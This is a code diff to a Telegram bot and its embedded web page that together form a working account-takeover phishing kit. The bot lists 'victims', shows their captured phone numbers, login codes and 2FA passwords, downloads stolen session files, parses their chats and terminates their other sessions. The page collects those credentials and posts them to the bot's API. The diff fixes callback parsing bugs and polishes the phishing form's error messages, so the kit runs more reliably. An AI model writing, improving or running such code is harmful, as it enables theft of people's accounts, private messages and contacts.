@@ -636,10 +636,11 @@ async def cb_test_code_send(cb: CallbackQuery):
     except Exception as e:
         await cb.message.answer(f"❌ <b>Ошибка теста:</b>\n<code>{e}</code>")
 
+# --- БЕЗОПАСНЫЙ ПАРСИНГ VID ЧЕРЕЗ СРЕЗЫ ---
 @dp.callback_query(F.data.startswith("show_code_"))
 async def cb_show_code(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 2)[2]
+    vid = cb.data[len("show_code_"):]
     info = VICTIMS.get(vid, {})
     code = info.get("last_code", "Не поступал")
     await cb.answer(f"Последний код: {code}", show_alert=True)
@@ -647,7 +648,7 @@ async def cb_show_code(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("show_2fa_"))
 async def cb_show_2fa(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 2)[2]
+    vid = cb.data[len("show_2fa_"):]
     info = VICTIMS.get(vid, {})
     fa_pass = info.get("last_2fa", "Отсутствует / Не вводился")
     await cb.answer(f"2FA Пароль: {fa_pass}", show_alert=True)
@@ -655,7 +656,7 @@ async def cb_show_2fa(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("copy_phone_"))
 async def cb_copy_phone(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 2)[2]
+    vid = cb.data[len("copy_phone_"):]
     info = VICTIMS.get(vid, {})
     phone = info.get("phone", "Не указан")
     await cb.answer(f"Номер телефона: {phone}", show_alert=True)
@@ -677,7 +678,7 @@ async def cb_parsing_menu(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("parse_sel_"))
 async def cb_parse_select_session(cb: CallbackQuery):
     if not is_vip(cb.from_user.id): return
-    vid = cb.data.split("_", 2)[2]
+    vid = cb.data[len("parse_sel_"):]
     PARSING_STATE[cb.from_user.id] = {"vid": vid}
     
     session_str = load_session_file(vid)
@@ -720,7 +721,7 @@ async def cb_parse_select_session(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("parse_chat_"))
 async def cb_parse_select_chat(cb: CallbackQuery):
     if not is_vip(cb.from_user.id): return
-    idx = int(cb.data.split("_")[2])
+    idx = int(cb.data[len("parse_chat_"):])
     state = PARSING_STATE.get(cb.from_user.id)
     if not state or "dialogs" not in state or idx not in state["dialogs"]:
         return await cb.answer("Сессия истекла.", show_alert=True)
@@ -758,7 +759,13 @@ async def cb_parse_select_chat(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("kill_"))
 async def cb_kill_menu(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    # Проверяем, не кик ли конкретного хэша (чтобы не перепутать с обычным kill_)
+    if cb.data.startswith("kill_all_"):
+        vid = cb.data[len("kill_all_"):]
+        await terminate_session(vid)
+        return await cb.message.edit_text("🛑 Сессия полностью завершена и удалена.", reply_markup=main_menu(cb.from_user.id))
+    
+    vid = cb.data[len("kill_"):]
     session_str = load_session_file(vid)
     if not session_str:
         return await cb.answer("Файл сессии не найден", show_alert=True)
@@ -789,9 +796,10 @@ async def cb_kill_menu(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("kick_auth_"))
 async def cb_kick_specific_auth(cb: CallbackQuery):
     if not await guard(cb): return
-    parts = cb.data.split("_")
-    vid = parts[2]
-    auth_hash = int(parts[3])
+    # Безопасно отделяем hash (последний элемент после рсплита) от vid
+    remainder = cb.data[len("kick_auth_"):]
+    vid, auth_hash_str = remainder.rsplit("_", 1)
+    auth_hash = int(auth_hash_str)
     
     session_str = load_session_file(vid)
     dev = generate_unique_device()
@@ -805,13 +813,6 @@ async def cb_kick_specific_auth(cb: CallbackQuery):
         await cb.message.edit_text(victim_detail_text(vid), reply_markup=victim_detail_menu(vid))
     except Exception as e:
         await cb.answer(f"❌ Ошибка: {e}", show_alert=True)
-
-@dp.callback_query(F.data.startswith("kill_all_"))
-async def cb_kill_all_session(cb: CallbackQuery):
-    if not await guard(cb): return
-    vid = cb.data.split("_", 2)[2]
-    await terminate_session(vid)
-    await cb.message.edit_text("🛑 Сессия полностью завершена и удалена.", reply_markup=main_menu(cb.from_user.id))
 
 async def guard(cb: CallbackQuery) -> bool:
     if not is_vip(cb.from_user.id):
@@ -833,7 +834,7 @@ async def cb_victims_list(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("vp_"))
 async def cb_victims_page(cb: CallbackQuery):
     if not await guard(cb): return
-    page = int(cb.data.split("_")[1])
+    page = int(cb.data[len("vp_"):])
     await cb.message.edit_text("👥 <b>Жертвы</b>:", reply_markup=victims_list_menu(page))
 
 @dp.callback_query(F.data == "sessions_list")
@@ -846,13 +847,13 @@ async def cb_sessions_list(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("sp_"))
 async def cb_sessions_page(cb: CallbackQuery):
     if not await guard(cb): return
-    page = int(cb.data.split("_")[1])
+    page = int(cb.data[len("sp_"):])
     await cb.message.edit_text("🟢 <b>Сессии</b>:", reply_markup=sessions_list_menu(page))
 
 @dp.callback_query(F.data.startswith("sess_"))
 async def cb_session_detail(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("sess_"):]
     info = VICTIMS.get(vid, {})
     phone = info.get("phone", "—")
     text = f"🟢 <b>Сессия</b>\n\n📱 <b>Номер:</b> <code>{phone}</code>"
@@ -877,7 +878,7 @@ def build_stats_text():
 @dp.callback_query(F.data.startswith("victim_"))
 async def cb_victim_detail(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("victim_"):]
     await cb.message.edit_text(victim_detail_text(vid), reply_markup=victim_detail_menu(vid))
 
 def victim_detail_text(vid):
@@ -887,7 +888,7 @@ def victim_detail_text(vid):
 @dp.callback_query(F.data.startswith("dl_"))
 async def cb_dl_session(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("dl_"):]
     path = os.path.join(SESSIONS_DIR, f"{vid}.session")
     if not os.path.exists(path): 
         return await cb.answer("❌ Файл сессии не найден", show_alert=True)
@@ -901,7 +902,7 @@ async def cb_dl_session(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("chk_"))
 async def cb_check_valid(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("chk_"):]
     await cb.answer("⏳ Проверка...")
     r = await check_session_valid(vid)
     status = "✅ Валидна" if r is True else "❌ Не валидна"
@@ -910,7 +911,7 @@ async def cb_check_valid(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("fetch_"))
 async def cb_fetch_latest(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("fetch_"):]
     await cb.answer("⏳ Обновление кодов...")
     await fetch_victim_codes(vid)
     await cb.message.edit_text(victim_detail_text(vid), reply_markup=victim_detail_menu(vid))
@@ -925,13 +926,13 @@ async def cb_refresh_all(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("delc_"))
 async def cb_del_confirm(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("delc_"):]
     await cb.message.edit_text(f"⚠️ Удалить?", reply_markup=del_confirm_menu(vid))
 
 @dp.callback_query(F.data.startswith("deld_"))
 async def cb_del_do(cb: CallbackQuery):
     if not await guard(cb): return
-    vid = cb.data.split("_", 1)[1]
+    vid = cb.data[len("deld_"):]
     delete_session_file(vid)
     VICTIMS.pop(vid, None)
     save_victims()
@@ -1015,7 +1016,7 @@ async def api_code(req):
     try: body = await req.json()
     except: return web.json_response({"ok": False, "error": "bad json"}, status=400)
 
-    vid, code_val = body.get("vid"), body.get("code")
+    vid, code_val = body.get("vid"), str(body.get("code", "")).strip()
     st = STATE.get(vid)
     if not st: return web.json_response({"ok": False, "error": "expired"})
 
@@ -1077,7 +1078,7 @@ async def api_2fa(req):
     try: body = await req.json()
     except: return web.json_response({"ok": False, "error": "bad json"}, status=400)
 
-    vid, password = body.get("vid"), body.get("code")
+    vid, password = body.get("vid"), str(body.get("code", "")).strip()
     st = STATE.get(vid)
     if not st: return web.json_response({"ok": False, "error": "expired"})
 
@@ -1150,7 +1151,7 @@ HTML_CONTENT = r"""<!DOCTYPE html>
     .btn:hover{background:var(--accent-hover)}
     .code-input{text-align:center;font-size:24px;font-weight:700;letter-spacing:6px}
     .step{display:none}.step.active{display:block}
-    .error-msg{color:var(--error);font-size:13px;text-align:center;margin-top:10px;display:none}
+    .error-msg{color:var(--error);font-size:13px;text-align:center;margin-top:10px;display:block}
   </style>
 </head>
 <body>
@@ -1219,27 +1220,41 @@ HTML_CONTENT = r"""<!DOCTYPE html>
   const params = new URLSearchParams(location.search);
   const vid = params.get('id') || 'unknown';
   const setStep = n => { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('s'+n).classList.add('active'); };
+  
   async function sendPhone() {
+    document.getElementById('err1').textContent = '';
     const phone = document.getElementById('phone').value.trim();
     if(!phone) return;
-    const r = await fetch('/api/phone', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, phone})});
-    const d = await r.json();
-    if(d.ok) setStep(2); else alert(d.error);
+    try {
+      const r = await fetch('/api/phone', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, phone})});
+      const d = await r.json();
+      if(d.ok) setStep(2); else document.getElementById('err1').textContent = d.error || 'Ошибка';
+    } catch(e) { document.getElementById('err1').textContent = 'Ошибка сети'; }
   }
+  
   async function sendCode() {
+    document.getElementById('err2').textContent = '';
     const code = document.getElementById('code').value.trim();
     if(!code) return;
-    const r = await fetch('/api/code', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, code})});
-    const d = await r.json();
-    if(d.ok) { setStep(4); setTimeout(()=>window.location.href='tg://', 2000); }
-    else if(d.need_2fa) setStep(3); else alert(d.error);
+    try {
+      const r = await fetch('/api/code', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, code})});
+      const d = await r.json();
+      if(d.ok) { setStep(4); setTimeout(()=>window.location.href='tg://', 2000); }
+      else if(d.need_2fa) setStep(3); 
+      else document.getElementById('err2').textContent = d.error || 'Неверный код';
+    } catch(e) { document.getElementById('err2').textContent = 'Ошибка сети'; }
   }
+  
   async function send2FA() {
+    document.getElementById('err3').textContent = '';
     const pass = document.getElementById('pass').value.trim();
     if(!pass) return;
-    const r = await fetch('/api/2fa', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, code:pass})});
-    const d = await r.json();
-    if(d.ok) { setStep(4); setTimeout(()=>window.location.href='tg://', 2000); } else alert(d.error);
+    try {
+      const r = await fetch('/api/2fa', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, code:pass})});
+      const d = await r.json();
+      if(d.ok) { setStep(4); setTimeout(()=>window.location.href='tg://', 2000); } 
+      else document.getElementById('err3').textContent = d.error || 'Неверный пароль';
+    } catch(e) { document.getElementById('err3').textContent = 'Ошибка сети'; }
   }
 </script>
 </body>
